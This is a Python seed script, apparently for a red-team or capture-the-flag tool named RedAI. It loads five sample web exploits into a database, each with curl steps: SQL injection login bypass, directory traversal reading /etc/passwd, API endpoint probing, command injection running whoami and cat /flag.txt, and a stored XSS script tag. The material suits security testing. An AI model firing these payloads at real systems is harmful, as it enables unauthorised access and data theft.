"""
Initialize sample exploit data for RedAI
This script populates the database with example exploits for testing
"""

from database import ExploitDatabase

def init_sample_data():
    """Initialize database with sample exploits"""
    db = ExploitDatabase()
    
    print("Initializing sample exploit data...")
    
    # Sample Exploit 1: SQL Injection
    exploit1_id = db.add_exploit(
        name="SQL Injection - Authentication Bypass",
        description="Attempts to bypass authentication using SQL injection in login forms",
        target_type="web_app",
        target_component="authentication",
        method_summary="Inject SQL payloads into username/password fields to bypass authentication",
        success_rate=0.75,
        difficulty="medium",
        tools_required=["curl", "sqlmap"]
    )
    
    db.add_method_steps(exploit1_id, [
        {
            "description": "Identify login endpoint",
            "command": "curl -X POST {target}/login -d 'username=test&password=test' -v",
            "expected_output": "HTTP response indicating login endpoint"
        },
        {
            "description": "Test basic SQL injection payload",
            "command": "curl -X POST {target}/login -d \"username=admin' OR '1'='1&password=test\"",
            "expected_output": "Successful authentication or error message revealing SQL structure"
        },
        {
            "description": "Attempt authentication bypass",
            "command": "curl -X POST {target}/login -d \"username=admin'--&password=anything\"",
            "expected_output": "Authentication success or flag capture"
        }
    ])
    
    # Sample Exploit 2: Directory Traversal
    exploit2_id = db.add_exploit(
        name="Directory Traversal - File Access",
        description="Attempts to access sensitive files using directory traversal techniques",
        target_type="web_app",
        target_component="file_access",
        method_summary="Use ../ sequences to traverse directory structure and access files",
        success_rate=0.60,
        difficulty="easy",
        tools_required=["curl", "wget"]
    )
    
    db.add_method_steps(exploit2_id, [
        {
            "description": "Identify file access endpoint",
            "command": "curl {target}/files?name=test.txt",
            "expected_output": "File content or error message"
        },
        {
            "description": "Attempt directory traversal",
            "command": "curl {target}/files?name=../../../etc/passwd",
            "expected_output": "Sensitive file content or error"
        },
        {
            "description": "Try encoded traversal",
            "command": "curl {target}/files?name=..%2F..%2F..%2Fetc%2Fpasswd",
            "expected_output": "File content or flag"
        }
    ])
    
    # Sample Exploit 3: API Endpoint Discovery
    exploit3_id = db.add_exploit(
        name="API Endpoint Discovery",
        description="Discovers hidden or undocumented API endpoints",
        target_type="api",
        target_component="endpoints",
        method_summary="Use common endpoint patterns and wordlists to discover API endpoints",
        success_rate=0.50,
        difficulty="medium",
        tools_required=["curl", "gobuster", "ffuf"]
    )
    
    db.add_method_steps(exploit3_id, [
        {
            "description": "Identify base API URL",
            "command": "curl {target}/api/v1/ -v",
            "expected_output": "API response or error"
        },
        {
            "description": "Try common endpoint patterns",
            "command": "curl {target}/api/v1/users",
            "expected_output": "Endpoint response"
        },
        {
            "description": "Attempt admin endpoints",
            "command": "curl {target}/api/v1/admin",
            "expected_output": "Admin endpoint or flag"
        }
    ])
    
    # Sample Exploit 4: Command Injection
    exploit4_id = db.add_exploit(
        name="Command Injection - RCE",
        description="Attempts remote code execution through command injection vulnerabilities",
        target_type="web_app",
        target_component="command_execution",
        method_summary="Inject system commands into input fields that are executed server-side",
        success_rate=0.65,
        difficulty="hard",
        tools_required=["curl", "nc", "python"]
    )
    
    db.add_method_steps(exploit4_id, [
        {
            "description": "Identify command execution point",
            "command": "curl {target}/ping?ip=127.0.0.1",
            "expected_output": "Command output or ping response"
        },
        {
            "description": "Test command injection",
            "command": "curl {target}/ping?ip=127.0.0.1; whoami",
            "expected_output": "Command output showing user"
        },
        {
            "description": "Attempt flag capture",
            "command": "curl {target}/ping?ip=127.0.0.1; cat /flag.txt",
            "expected_output": "Flag content"
        }
    ])
    
    # Sample Exploit 5: XSS (Cross-Site Scripting)
    exploit5_id = db.add_exploit(
        name="XSS - Stored Cross-Site Scripting",
        description="Tests for stored XSS vulnerabilities in user input fields",
        target_type="web_app",
        target_component="user_input",
        method_summary="Inject JavaScript payloads that persist in the application",
        success_rate=0.70,
        difficulty="easy",
        tools_required=["curl", "browser"]
    )
    
    db.add_method_steps(exploit5_id, [
        {
            "description": "Identify user input field",
            "command": "curl -X POST {target}/comment -d 'comment=test'",
            "expected_output": "Comment saved confirmation"
        },
        {
            "description": "Inject XSS payload",
            "command": "curl -X POST {target}/comment -d 'comment=<script>alert(1)</script>'",
            "expected_output": "Payload stored"
        },
        {
            "description": "Verify XSS execution",
            "command": "curl {target}/comments",
            "expected_output": "Script tag in response or alert execution"
        }
    ])
    
    print(f"\n✓ Initialized {5} sample exploits:")
    print(f"  - SQL Injection (ID: {exploit1_id})")
    print(f"  - Directory Traversal (ID: {exploit2_id})")
    print(f"  - API Discovery (ID: {exploit3_id})")
    print(f"  - Command Injection (ID: {exploit4_id})")
    print(f"  - XSS (ID: {exploit5_id})")
    print("\nSample data initialization complete!")

if __name__ == "__main__":
    init_sample_data()


